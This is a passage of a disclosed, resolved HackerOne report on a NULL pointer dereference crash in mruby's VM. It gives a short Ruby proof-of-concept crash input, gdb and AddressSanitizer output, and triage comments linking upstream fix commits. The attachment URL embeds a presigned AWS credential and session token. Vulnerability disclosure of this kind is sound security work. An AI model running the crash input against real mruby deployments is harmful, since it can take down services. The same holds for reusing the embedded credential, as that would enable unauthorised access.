{"id":214845,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ4NDU=","url":"https://hackerone.com/reports/214845","title":"SIGSEGV in mrb_vm_exec","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-20T10:27:37.175Z","submitted_at":"2017-03-20T10:27:37.175Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-13T21:30:42.349Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-04-13T21:30:40.747Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_vm_exec.rb):\n\n\ts=proc{|f,g,x|f[x][g[x]]}.curry\n\tk=proc{|x,y|x}.curry\n\ti=proc{|x|x}.curry\n\tfi0=[]\n\tre0=proc{|x|fi0.size;x}.curry\n\t[s[s[i][i]][k[i]]][0][s[s[k[s]][s[k[s]][s[s[k[s]][s[k[s[k[re0]]]][s[k[s]][k]]]][k]]]][k[s[k[s]][k]]]]\n\nDebug - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb\n\tReading symbols from ./mirb...done.\n\t(gdb) r test_mrb_vm_exec.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_vm_exec.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e #\u003cProc:0x6b2290@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e #\u003cProc:0x6b2080@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e #\u003cProc:0x6b1e70@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e []\n\t =\u003e #\u003cProc:0x6b1660@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 \u003ccall_iseq\u003e) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t1361\t          regs[0] = m-\u003eenv-\u003estack[0];\n\t(gdb) info reg\n\trax            0x3\t3\n\trbx            0x7ffff7fa2400\t140737353753600\n\trcx            0x7ffff7fa23c0\t140737353753536\n\trdx            0xffffffffffffffff\t-1\n\trsi            0x4\t4\n\trdi            0x7ffff7fa23f0\t140737353753584\n\trbp            0x7fffffffc930\t0x7fffffffc930\n\trsp            0x7fffffffc360\t0x7fffffffc360\n\tr8             0x3\t3\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x1\t1\n\tr11            0x246\t582\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x407731\t0x407731 \u003cmrb_vm_exec+8963\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1356\t        }\n\t1357\t        else {\n\t1358\t          stack_extend(mrb, irep-\u003enregs, ci-\u003eargc+2);\n\t1359\t        }\n\t1360\t        if(m-\u003eenv) {\n\t1361\t          regs[0] = m-\u003eenv-\u003estack[0];\n\t1362\t        }\n\t1363\t        pc = irep-\u003eiseq;\n\t1364\t        JUMP;\n\t1365\t      }\n\t(gdb) x/x $rax\n\t0x3:\tCannot access memory at address 0x3\n\nBacktrace - mirb\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 \u003ccall_iseq\u003e) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t#1  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b15a0, self=..., stack_keep=6) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_vm_exec.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e #\u003cProc:0x62f0000021a0@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e #\u003cProc:0x62f000001f90@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e #\u003cProc:0x62f000001d80@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\t =\u003e []\n\t =\u003e #\u003cProc:0x62f000001570@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u003e\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==2439==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000003 (pc 0x0000004f7e0d bp 0x7ffff413e660 sp 0x7ffff413d8d0 T0)\n\t\t#0 0x4f7e0c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n\t\t#1 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#2 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#3 0x7f8014effec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#4 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n\t==2439==ABORTING\n\nDebug - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby\n\tReading symbols from ./mruby...done.\n\t(gdb) r test_mrb_vm_exec.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_vm_exec.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 \u003ccall_iseq\u003e) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t1361\t          regs[0] = m-\u003eenv-\u003estack[0];\n\t(gdb) info reg\n\trax            0x2\t2\n\trbx            0x7ffff7325290\t140737340658320\n\trcx            0x7ffff7325250\t140737340658256\n\trdx            0xffffffffffffffff\t-1\n\trsi            0x4\t4\n\trdi            0x7ffff7325280\t140737340658304\n\trbp            0x7fffffffdb30\t0x7fffffffdb30\n\trsp            0x7fffffffd560\t0x7fffffffd560\n\tr8             0x3\t3\n\tr9             0x46e911\t4647185\n\tr10            0x21021\t135201\n\tr11            0x201\t513\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x44248a\t0x44248a \u003cmrb_vm_exec+8963\u003e\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1356\t        }\n\t1357\t        else {\n\t1358\t          stack_extend(mrb, irep-\u003enregs, ci-\u003eargc+2);\n\t1359\t        }\n\t1360\t        if(m-\u003eenv) {\n\t1361\t          regs[0] = m-\u003eenv-\u003estack[0];\n\t1362\t        }\n\t1363\t        pc = irep-\u003eiseq;\n\t1364\t        JUMP;\n\t1365\t      }\n\t(gdb) x/x $rax\n\t0x2:\tCannot access memory at address 0x2\n\t\nBacktrace - mruby\n-------------------\n\n\t(gdb) bt\n\t#0  0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 \u003ccall_iseq\u003e) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t#1  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#2  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614\n\t#3  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cf10, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n\t#4  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cb50, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n\t#5  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\t\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_vm_exec.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==2413==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000002 (pc 0x00000053d26d bp 0x7fff0300bd40 sp 0x7fff0300afb0 T0)\n\t\t#0 0x53d26c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n\t\t#1 0x53b00e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#2 0x543ad3 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12\n\t\t#3 0x52cc90 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7\n\t\t#4 0x52ce62 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10\n\t\t#5 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11\n\t\t#6 0x7fe2af970ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#7 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n\t==2413==ABORTING","vulnerability_information_html":"\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as test_mrb_vm_exec.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003es=proc{|f,g,x|f[x][g[x]]}.curry\nk=proc{|x,y|x}.curry\ni=proc{|x|x}.curry\nfi0=[]\nre0=proc{|x|fi0.size;x}.curry\n[s[s[i][i]][k[i]]][0][s[s[k[s]][s[k[s]][s[s[k[s]][s[k[s[k[re0]]]][s[k[s]][k]]]][k]]]][k[s[k[s]][k]]]]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mirb\"\u003eDebug - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb\nReading symbols from ./mirb...done.\n(gdb) r test_mrb_vm_exec.rb \nStarting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_vm_exec.rb\nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; #\u0026lt;Proc:0x6b2290@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; #\u0026lt;Proc:0x6b2080@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; #\u0026lt;Proc:0x6b1e70@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; []\n =\u0026gt; #\u0026lt;Proc:0x6b1660@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/test/mruby/src/vm.c:1361\n1361              regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n(gdb) info reg\nrax            0x3  3\nrbx            0x7ffff7fa2400   140737353753600\nrcx            0x7ffff7fa23c0   140737353753536\nrdx            0xffffffffffffffff   -1\nrsi            0x4  4\nrdi            0x7ffff7fa23f0   140737353753584\nrbp            0x7fffffffc930   0x7fffffffc930\nrsp            0x7fffffffc360   0x7fffffffc360\nr8             0x3  3\nr9             0x7ffff7acd7b8   140737348687800\nr10            0x1  1\nr11            0x246    582\nr12            0x401ca0 4201632\nr13            0x7fffffffdf30   140737488346928\nr14            0x0  0\nr15            0x0  0\nrip            0x407731 0x407731 \u0026lt;mrb_vm_exec+8963\u0026gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n1356            }\n1357            else {\n1358              stack_extend(mrb, irep-\u0026gt;nregs, ci-\u0026gt;argc+2);\n1359            }\n1360            if(m-\u0026gt;env) {\n1361              regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n1362            }\n1363            pc = irep-\u0026gt;iseq;\n1364            JUMP;\n1365          }\n(gdb) x/x $rax\n0x3:    Cannot access memory at address 0x3\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mirb\"\u003eBacktrace - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/test/mruby/src/vm.c:1361\n#1  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b15a0, self=..., stack_keep=6) at /home/x/Desktop/test/mruby/src/vm.c:823\n#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mirb\"\u003eClang - mirb\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_vm_exec.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; #\u0026lt;Proc:0x62f0000021a0@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; #\u0026lt;Proc:0x62f000001f90@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; #\u0026lt;Proc:0x62f000001d80@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\n =\u0026gt; []\n =\u0026gt; #\u0026lt;Proc:0x62f000001570@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30\u0026gt;\nASAN:DEADLYSIGNAL\n=================================================================\n==2439==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000003 (pc 0x0000004f7e0d bp 0x7ffff413e660 sp 0x7ffff413d8d0 T0)\n    #0 0x4f7e0c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n    #1 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n    #2 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n    #3 0x7f8014effec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #4 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n==2439==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug-mruby\"\u003eDebug - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby\nReading symbols from ./mruby...done.\n(gdb) r test_mrb_vm_exec.rb \nStarting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_vm_exec.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/test/mruby/src/vm.c:1361\n1361              regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n(gdb) info reg\nrax            0x2  2\nrbx            0x7ffff7325290   140737340658320\nrcx            0x7ffff7325250   140737340658256\nrdx            0xffffffffffffffff   -1\nrsi            0x4  4\nrdi            0x7ffff7325280   140737340658304\nrbp            0x7fffffffdb30   0x7fffffffdb30\nrsp            0x7fffffffd560   0x7fffffffd560\nr8             0x3  3\nr9             0x46e911 4647185\nr10            0x21021  135201\nr11            0x201    513\nr12            0x401b20 4201248\nr13            0x7fffffffdf30   140737488346928\nr14            0x0  0\nr15            0x0  0\nrip            0x44248a 0x44248a \u0026lt;mrb_vm_exec+8963\u0026gt;\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n1356            }\n1357            else {\n1358              stack_extend(mrb, irep-\u0026gt;nregs, ci-\u0026gt;argc+2);\n1359            }\n1360            if(m-\u0026gt;env) {\n1361              regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n1362            }\n1363            pc = irep-\u0026gt;iseq;\n1364            JUMP;\n1365          }\n(gdb) x/x $rax\n0x2:    Cannot access memory at address 0x2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace-mruby\"\u003eBacktrace - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/test/mruby/src/vm.c:1361\n#1  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823\n#2  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614\n#3  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cf10, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n#4  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cb50, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n#5  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mruby\"\u003eClang - mruby\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_vm_exec.rb \nASAN:DEADLYSIGNAL\n=================================================================\n==2413==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000002 (pc 0x00000053d26d bp 0x7fff0300bd40 sp 0x7fff0300afb0 T0)\n    #0 0x53d26c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n    #1 0x53b00e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n    #2 0x543ad3 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12\n    #3 0x52cc90 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7\n    #4 0x52ce62 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10\n    #5 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11\n    #6 0x7fe2af970ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #7 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n==2413==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":51,"name":"NULL Pointer Dereference"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":170112,"file_name":"test_mrb_vm_exec.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/170/112/b7b3bc8e7d4b7e29f4fcd62e3bc0de2a15047733/test_mrb_vm_exec.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_vm_exec.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_vm_exec.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045808Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=3326030c9da70e4bace1962902b5567b43507657dda50010405d12d1a6dab3ed","file_size":210,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-05-13T21:30:40.779Z","allow_singular_disclosure_after":-114506847.32070124,"singular_disclosure_allowed":true,"vote_count":6,"voters":["eveeez","apapedulimu","m7mdharoun","linkks","spetr0x","pkhadka"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1551812,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-20T10:27:37.370Z","updated_at":"2017-03-20T10:27:37.370Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1555483,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3534","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the crash and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3534\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3534\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3534\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-21T19:15:16.863Z","updated_at":"2017-03-21T19:15:16.863Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1580720,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was addressed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/246db71139a78ab05fe2750663c7e900c2f3c7ce\nhttps://github.com/mruby/mruby/commit/0a1f15e57c061d4caee8dfff2366886bff4ed513\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again 